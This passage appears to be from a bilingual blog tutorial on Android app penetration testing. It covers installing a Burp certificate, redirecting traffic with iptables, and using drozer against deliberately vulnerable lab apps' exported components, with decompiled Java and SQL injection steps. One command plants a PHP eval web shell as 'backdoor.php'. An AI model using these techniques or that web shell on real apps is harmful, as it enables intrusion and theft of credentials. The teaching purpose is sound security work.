  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl x509 -inform DER -in burp.der -out burp.pem</span><br><span class="line">openssl x509 -subject_hash_old -in burp.pemï¼ˆmaybe the result is &quot;9a5ba575&quot;ï¼‰</span><br><span class="line">mv burp.pem 9a5ba575.0</span><br><span class="line">adb root</span><br><span class="line">adb push 9a5ba575.0 /sdcard/download</span><br><span class="line">adb shell mv /sdcard/Downlaod/9a5ba575.0 /system/etc/security/cacerts/</span><br><span class="line">adb shell chmod 644 /system/etc/security/cacerts/9a5ba575.0</span><br><span class="line">adb shell chown root:root /system/etc/security/cacerts/9a5ba575.0</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>If there are built-in certificates within the clientï¼šreverse the app and hook the cert.</p>
</li>
<li><p>If the directory is read-only, remount the disk.</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">é‡æ–°æŒ‚è½½ç³»ç»Ÿåˆ†åŒºä¸ºå¯è¯»å†™æ¨¡å¼</span></span><br><span class="line">mount -o rw,remount /system</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æˆ–è€…å°è¯•è¿™ä¸ªå‘½ä»¤ï¼ˆæ ¹æ®è®¾å¤‡ä¸åŒï¼‰</span></span><br><span class="line">mount -o remount,rw /</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">é‡æ–°æŒ‚è½½ä¸ºåªè¯»æ¨¡å¼ä»¥ä¿æŠ¤ç³»ç»Ÿ</span></span><br><span class="line">mount -o ro,remount /system</span><br><span class="line"></span><br><span class="line">æ³¨æ„äº‹é¡¹ï¼š</span><br><span class="line">éœ€è¦ Root æƒé™ï¼šè¿™äº›æ“ä½œéœ€è¦è®¾å¤‡å·²ç»è·å– root æƒé™</span><br><span class="line">ç¡®è®¤è®¾å¤‡å·² rootï¼šå…ˆæ‰§è¡Œ su å‘½ä»¤è·å– root æƒé™</span><br><span class="line">ä¸åŒè®¾å¤‡å¯èƒ½ç•¥æœ‰å·®å¼‚ï¼šæœ‰äº›è½¦æœºå¯èƒ½ä½¿ç”¨ /system_root æˆ–å…¶ä»–æŒ‚è½½ç‚¹</span><br></pre></td></tr></table></figure>
</li>
<li><p>Forward traffic</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1. é€šè¿‡ ADB è¿›å…¥è®¾å¤‡</span></span><br><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2. ä½¿ç”¨ iptables å¼ºåˆ¶é‡å®šå‘æ‰€æœ‰ HTTP/HTTPS æµé‡</span></span><br><span class="line">iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination 172.20.10.6:8080</span><br><span class="line">iptables -t nat -A OUTPUT -p tcp --dport 443 -j DNAT --to-destination 172.20.10.6:8080</span><br><span class="line">iptables -t nat -A POSTROUTING -j MASQUERADE</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">3. éªŒè¯è§„åˆ™</span></span><br><span class="line">iptables -t nat -L -n</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æ¸…é™¤è§„åˆ™ï¼ˆå®Œæˆåæ‰§è¡Œï¼‰</span></span><br><span class="line">iptables -t nat -F</span><br><span class="line"></span><br><span class="line">æ³¨æ„ï¼šBurpSuiteåº”è¯¥åœ¨ä»£ç†è®¾ç½®æ¨¡å—ï¼Œé€‰æ‹©åˆé€‚çš„ç½‘å¡è¿›è¡Œç›‘å¬ï¼ˆé»˜è®¤ä¸º127.0.0.1ï¼‰</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="åFridaè°ƒè¯•"><a href="#åFridaè°ƒè¯•" class="headerlink" title="åFridaè°ƒè¯•"></a>åFridaè°ƒè¯•</h2><h3 id="ä¿®æ”¹å¯åŠ¨ç«¯å£"><a href="#ä¿®æ”¹å¯åŠ¨ç«¯å£" class="headerlink" title="ä¿®æ”¹å¯åŠ¨ç«¯å£"></a>ä¿®æ”¹å¯åŠ¨ç«¯å£</h3><p><img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251015173121566.png" alt="image-20251015173121566"></p>
<p><img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251015173149587.png" alt="image-20251015173149587"></p>
<h2 id="Four-Major-Components"><a href="#Four-Major-Components" class="headerlink" title="Four Major Components"></a>Four Major Components</h2><h3 id="Activity"><a href="#Activity" class="headerlink" title="Activity"></a>Activity</h3><table>
<thead>
<tr>
<th align="center">Attack Surface</th>
<th align="center">Harm</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Unauthorized Access</td>
<td align="center">ä¾‹å¦‚ï¼šç»•è¿‡ç™»é™†ç•Œé¢ï¼Œç›´æ¥è°ƒç”¨ã€è®¿é—®åé¢çš„activityç•Œé¢</td>
</tr>
<tr>
<td align="center">DoS</td>
<td align="center">é€šè¿‡Intentç»™Activityä¼ è¾“ç•¸å½¢æ•°æ®ï¼Œå¯¼è‡´ç¨‹åºå´©æºƒ</td>
</tr>
<tr>
<td align="center">Implicit Itent Hajacking</td>
<td align="center">æ”¾åœ¨ä¸€ä¸ªä¸€æ ·çš„ç•Œé¢ï¼Œæ”¶é›†ç”¨æˆ·çš„è´¦å·å¯†ç </td>
</tr>
</tbody></table>
<h4 id="Unauthorized-Access"><a href="#Unauthorized-Access" class="headerlink" title="Unauthorized Access"></a>Unauthorized Access</h4><ol>
<li><p>Deploy environment</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. æµ‹è¯•APPï¼šhttps://github.com/as0ler/Android-Examples</span><br><span class="line">2. æµ‹è¯•å·¥å…·ï¼šhttps://github.com/ReversecLabs/drozer; https://github.com/ReversecLabs/drozer-agent</span><br></pre></td></tr></table></figure>
</li>
<li><p>Start the test app(testapp) and get itâ€™s package name with â€œApp messengerâ€ or other ways</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922105330948.png" alt="image-20250922105330948"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922131340290.png" alt="image-20250922131340290"></p>
</li>
<li><p>Connect the device and enter drozerâ€™s console.</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922131448232.png" alt="image-20250922131448232"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922105753249.png" alt="image-20250922105753249"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922105838954.png" alt="image-20250922105838954"></p>
</li>
<li><p>Fint attacksufaces of the app.</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run app.package.attacksurface YourPacakgeName</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922110258485.png" alt="image-20250922110258485"></p>
</li>
<li><p>Verify exported activities</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run app.activity.info -a YourPackageName</span><br></pre></td></tr></table></figure>

<p> <img src="C:\Users\RedTeamer\AppData\Roaming\Typora\typora-user-images\image-20250922110649496.png" alt="image-20250922110649496"></p>
</li>
<li><p>Start other activity to bypass MainActivity</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run app.activity.start --component YourPackageName YourPackageName.ActivityName</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922111040903.png" alt="image-20250922111040903"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922131826719.png" alt="image-20250922131826719"></p>
</li>
</ol>
<h4 id="Implicit-Itent-Hijacking"><a href="#Implicit-Itent-Hijacking" class="headerlink" title="Implicit Itent Hijacking"></a>Implicit Itent Hijacking</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. å‚è€ƒæ–‡ç« ï¼šhttps://blog.csdn.net/qq_40037555/article/details/151955581</span><br><span class="line">2. éšå¼ Intent é€šè¿‡ actionã€categoryã€data ç­‰å±æ€§æ¥åŒ¹é…ç›®æ ‡ Activityï¼Œè€Œéç›´æ¥æŒ‡å®šå…·ä½“ç±»åã€‚è¿™æ„å‘³ç€ä»»ä½•åº”ç”¨åªè¦åœ¨ Manifest ä¸­å£°æ˜äº†åŒ¹é…è¿™äº›å±æ€§çš„ Activityï¼Œéƒ½å¯èƒ½è¢«ç³»ç»Ÿé€‰ä¸­å¹¶å¯åŠ¨ã€‚</span><br><span class="line">3. æ”»å‡»è€…å¯ä»¥åˆ›å»ºæ¶æ„åº”ç”¨ï¼Œåœ¨å…¶ Manifest ä¸­æ³¨å†Œä¸ç›®æ ‡åº”ç”¨ç›¸åŒçš„ Intent Filterï¼ˆåŒ…å«ç›¸åŒçš„ actionã€category ç­‰ï¼‰ã€‚å½“ç³»ç»Ÿè§£æéšå¼ Intent æ—¶ï¼Œæ¶æ„ Activity å¯èƒ½è¢«ä¼˜å…ˆåŒ¹é…å¹¶å¯åŠ¨ã€‚</span><br><span class="line">4. å»ºè®®å°½é‡ä½¿ç”¨æ˜¾å¼ Intent å¯åŠ¨å†…éƒ¨ Activityï¼Œå¯¹å¿…é¡»ä½¿ç”¨çš„éšå¼ Intentï¼Œåº”é€šè¿‡è®¾ç½®åŒ…åï¼ˆsetPackage ()ï¼‰æˆ–ä½¿ç”¨ç­¾åéªŒè¯ç­‰æ–¹å¼é™åˆ¶æ¥æ”¶è€…ã€‚</span><br></pre></td></tr></table></figure>

<ol>
<li><p>Test method of verify the vulnerability is same to â€œPriEsc and bypassâ€</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922151617879.png" alt="image-20250922151617879"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922151734047.png" alt="image-20250922151734047"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250922151829137.png" alt="image-20250922151829137"></p>
</li>
<li><p>But there are some differences in exploit the vulnerability. Attackers usually need to prepare the same page for fishing and an application for monitoring target activities to call the fishing page automatically.</p>
</li>
</ol>
<h3 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h3><table>
<thead>
<tr>
<th align="center">Attack Surface</th>
<th align="center">Harm</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Unauthorized Access</td>
<td align="center">Call the service to excute some dangerous functions with null privilege.</td>
</tr>
<tr>
<td align="center">Implicit Itent Hijacking</td>
<td align="center">Get some received sensitive datas or return some vicious datas to other functions.</td>
</tr>
</tbody></table>
<h4 id="Unauthorized-Access-1"><a href="#Unauthorized-Access-1" class="headerlink" title="Unauthorized Access"></a>Unauthorized Access</h4><ol>
<li><p>Find out the attack surfaces about service with drozer(test app: com.asec.alan)</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run app.package.attacksurface com.asec.alan</span><br><span class="line">run app.service.info -a com.asec.alan</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250923140010685.png" alt="image-20250923140010685"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250923140203300.png" alt="image-20250923140203300"></p>
</li>
<li><p>Confirm how the service is invoked by revesing the apk.</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.asec.alan;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Service;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.IBinder;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnerableService</span> <span class="keyword">extends</span> <span class="title class_">Service</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;VulnerableService&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.app.Service</span></span><br><span class="line">    <span class="keyword">public</span> IBinder <span class="title function_">onBind</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.app.Service</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">onStartCommand</span><span class="params">(Intent intent, <span class="type">int</span> i, <span class="type">int</span> i2)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (intent != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">action</span> <span class="operator">=</span> intent.getAction();</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;com.asec.alan.ACTION_WRITE_FILE&quot;</span>.equals(action)) &#123;</span><br><span class="line">                writeToFile(intent.getStringExtra(<span class="string">&quot;file_path&quot;</span>), intent.getStringExtra(<span class="string">&quot;content&quot;</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;com.asec.alan.ACTION_GET_SECRET&quot;</span>.equals(action)) &#123;</span><br><span class="line">                Log.d(TAG, <span class="string">&quot;æ•æ„Ÿä¿¡æ¯: &quot;</span> + getSensitiveInformation());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.onStartCommand(intent, i, i2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeToFile</span><span class="params">(String str, String str2)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileWriter</span> <span class="variable">fileWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="keyword">new</span> <span class="title class_">File</span>(str));</span><br><span class="line">            fileWriter.write(str2);</span><br><span class="line">            fileWriter.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            Log.e(TAG, <span class="string">&quot;å†™å…¥æ–‡ä»¶é”™è¯¯&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">getSensitiveInformation</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;æ•°æ®åº“å¯†ç : dbpass123; APIå¯†é’¥: secretkey456&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">service</span></span></span><br><span class="line"><span class="tag">	<span class="attr">android:name</span>=<span class="string">&quot;com.asec.alan.VulnerableService&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>We can draw a conclusion that this service is invoked by starting rather than binding. So, we could start the service with drozer.</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Excute the <span class="keyword">function</span> named writeToFile by the action whitch value is com.asec.alan.ACTION_WRITE_FILE</span></span><br><span class="line">run app.service.start --component com.asec.alan com.asec.alan.VulnerableService --action com.asec.alan.ACTION_WRITE_FILE --extra string file_path &quot;/data/data/com.asec.alan/backdoor.php&quot; --extra string content &quot;&lt;?php @eval($_POST[&#x27;TscanPlus&#x27;]); ?&gt;&quot;</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250923142017901.png" alt="image-20250923142017901"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250923142047595.png" alt="image-20250923142047595"></p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Monitor the <span class="built_in">log</span> by adb</span></span><br><span class="line">adb logcat VulnerableService:D *:S</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Excute the <span class="keyword">function</span> named getSensitiveInformation by the action <span class="built_in">which</span> value is com.asec.alan.ACTION_GET_SECRET</span></span><br><span class="line">run app.service.start --component com.asec.alan com.asec.alan.VulnerableService --action com.asec.alan.ACTION_GET_SECRET</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250923142723441.png" alt="image-20250923142723441"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250923142647122.png" alt="image-20250923142647122"></p>
</li>
</ol>
<h4 id="Implicit-Itent-Hijacking-1"><a href="#Implicit-Itent-Hijacking-1" class="headerlink" title="Implicit Itent Hijacking"></a>Implicit Itent Hijacking</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. éšå¼ Intent é€šè¿‡ actionã€categoryã€data ç­‰å±æ€§åŒ¹é… Serviceï¼Œè€Œéç›´æ¥æŒ‡å®šå…·ä½“ç±»åã€‚è¿™ä½¿å¾—ä»»ä½•åº”ç”¨åªè¦åœ¨ Manifest ä¸­æ³¨å†Œäº†åŒ¹é…è¿™äº›å±æ€§çš„ Serviceï¼Œéƒ½å¯èƒ½è¢«ç³»ç»Ÿé€‰ä¸­å¹¶å¯åŠ¨ã€‚æ”»å‡»è€…å¯é€šè¿‡ä¼ªè£…ç›¸åŒçš„ Intent Filterï¼Œè®©ç³»ç»Ÿä¼˜å…ˆå¯åŠ¨æ¶æ„ Serviceã€‚</span><br><span class="line">2. Service é€šå¸¸åœ¨åå°è¿è¡Œï¼Œç”¨æˆ·æ— æ³•ç›´æ¥æ„ŸçŸ¥å…¶å¯åŠ¨å’Œè¿è¡ŒçŠ¶æ€ã€‚å³ä½¿æ¶æ„ Service è¢«å¯åŠ¨ï¼Œç”¨æˆ·ä¹Ÿéš¾ä»¥å¯Ÿè§‰ï¼Œå¯¼è‡´æ¶æ„ä»£ç å¯é•¿æœŸåœ¨åå°æ‰§è¡Œæ•æ„Ÿæ“ä½œï¼ˆå¦‚ç›‘å¬æ•°æ®ã€ç¯¡æ”¹é€šä¿¡ç­‰ï¼‰ã€‚</span><br><span class="line">3. ä¸º Service è®¾ç½®è‡ªå®šä¹‰æƒé™ï¼ˆandroid:permissionï¼‰ï¼Œå¹¶æ ¡éªŒè°ƒç”¨è€…çš„ç­¾åæˆ–æƒé™;å¯¹å¿…é¡»ä½¿ç”¨çš„éšå¼ Intentï¼Œé€šè¿‡setPackage()é™åˆ¶ç›®æ ‡åº”ç”¨åŒ…åã€‚</span><br></pre></td></tr></table></figure>

<h3 id="Broadcast"><a href="#Broadcast" class="headerlink" title="Broadcast"></a>Broadcast</h3><h4 id="Unauthorized-Access-2"><a href="#Unauthorized-Access-2" class="headerlink" title="Unauthorized Access"></a>Unauthorized Access</h4><ol>
<li><p>Determine the information of broadcast</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run app.broadcast.info -a com.asec.alan</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924105533337.png" alt="image-20250924105533337"></p>
</li>
<li><p>Obtain the source code through decompilation</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.asec.alan;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.BroadcastReceiver;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnerableReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.BroadcastReceiver</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;com.asec.alan.ACTION_SENSITIVE_OPERATION&quot;</span>.equals(intent.getAction())) &#123;</span><br><span class="line">            performSensitiveOperation(context, intent.getStringExtra(<span class="string">&quot;operation&quot;</span>), intent.getStringExtra(<span class="string">&quot;data&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">performSensitiveOperation</span><span class="params">(Context context, String str, String str2)</span> &#123;</span><br><span class="line">        Toast.makeText(context, <span class="string">&quot;æ‰§è¡Œäº†æ“ä½œ: &quot;</span> + str + <span class="string">&quot;ï¼Œæ•°æ®: &quot;</span> + str2, <span class="number">1</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Send counterfeit messages to the broadcast</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run app.broadcast.send --component com.asec.alan com.asec.alan.VulnerableReceiver --action com.asec.alan.ACTION_SENSITIVE_OPERATION --extra string operation &quot;viciousData1&quot; --extra string data &quot;viciousData2&quot;</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924110021800.png" alt="image-20250924110021800"></p>
</li>
</ol>
<h3 id="Provider"><a href="#Provider" class="headerlink" title="Provider"></a>Provider</h3><h4 id="Unauthorized-Access-3"><a href="#Unauthorized-Access-3" class="headerlink" title="Unauthorized Access"></a>Unauthorized Access</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Content Provider æœªé™åˆ¶è®¿é—®æƒé™ï¼Œå¯¼è‡´åº”ç”¨å†…æ•æ„Ÿæ•°æ®ï¼ˆå¦‚ç”¨æˆ·ä¿¡æ¯ã€æ•°æ®åº“ï¼‰å¯è¢«ä»»æ„è¯»å–ã€‚</span><br></pre></td></tr></table></figure>

<ol>
<li><p>Find out the attacksurface about com.asec.alan</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924092722780.png" alt="image-20250924092722780"></p>
</li>
<li><p>Get the information about provider</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924092955453.png" alt="image-20250924092955453"></p>
</li>
<li><p>Find uri of this provider</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924094216723.png" alt="image-20250924094216723"></p>
</li>
<li><p>Query datas with uri</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924094356414.png" alt="image-20250924094356414"></p>
</li>
</ol>
<h4 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h4><ol>
<li><p>Find Sql Injection of the provider by running script</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924100755596.png" alt="image-20250924100755596"></p>
</li>
<li><p>Obtain the source code about ContentProvider through decompilation</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.asec.alan;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.ContentProvider;</span><br><span class="line"><span class="keyword">import</span> android.content.ContentValues;</span><br><span class="line"><span class="keyword">import</span> android.database.Cursor;</span><br><span class="line"><span class="keyword">import</span> android.database.SQLException;</span><br><span class="line"><span class="keyword">import</span> android.database.sqlite.SQLiteDatabase;</span><br><span class="line"><span class="keyword">import</span> android.database.sqlite.SQLiteOpenHelper;</span><br><span class="line"><span class="keyword">import</span> android.net.Uri;</span><br><span class="line"><span class="keyword">import</span> android.os.ParcelFileDescriptor;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnerableContentProvider</span> <span class="keyword">extends</span> <span class="title class_">ContentProvider</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DB_NAME</span> <span class="operator">=</span> <span class="string">&quot;userdata.db&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">DB_VERSION</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;VulnerableProvider&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> SQLiteOpenHelper dbHelper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">delete</span><span class="params">(Uri uri, String str, String[] strArr)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getType</span><span class="params">(Uri uri)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> Uri <span class="title function_">insert</span><span class="params">(Uri uri, ContentValues contentValues)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">update</span><span class="params">(Uri uri, ContentValues contentValues, String str, String[] strArr)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onCreate</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.dbHelper = <span class="keyword">new</span> <span class="title class_">SQLiteOpenHelper</span>(getContext(), DB_NAME, <span class="literal">null</span>, <span class="number">1</span>) &#123; <span class="comment">// from class: com.asec.alan.VulnerableContentProvider.1</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.database.sqlite.SQLiteOpenHelper</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onUpgrade</span><span class="params">(SQLiteDatabase sQLiteDatabase, <span class="type">int</span> i, <span class="type">int</span> i2)</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.database.sqlite.SQLiteOpenHelper</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(SQLiteDatabase sQLiteDatabase)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">                sQLiteDatabase.execSQL(<span class="string">&quot;CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)&quot;</span>);</span><br><span class="line">                sQLiteDatabase.execSQL(<span class="string">&quot;INSERT INTO users (username, password) VALUES (&#x27;admin&#x27;, &#x27;admin123&#x27;)&quot;</span>);</span><br><span class="line">                sQLiteDatabase.execSQL(<span class="string">&quot;INSERT INTO users (username, password) VALUES (&#x27;user1&#x27;, &#x27;pass1&#x27;)&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        createTestFile();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">createTestFile</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(getContext().getFilesDir(), <span class="string">&quot;test.txt&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (file.exists()) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            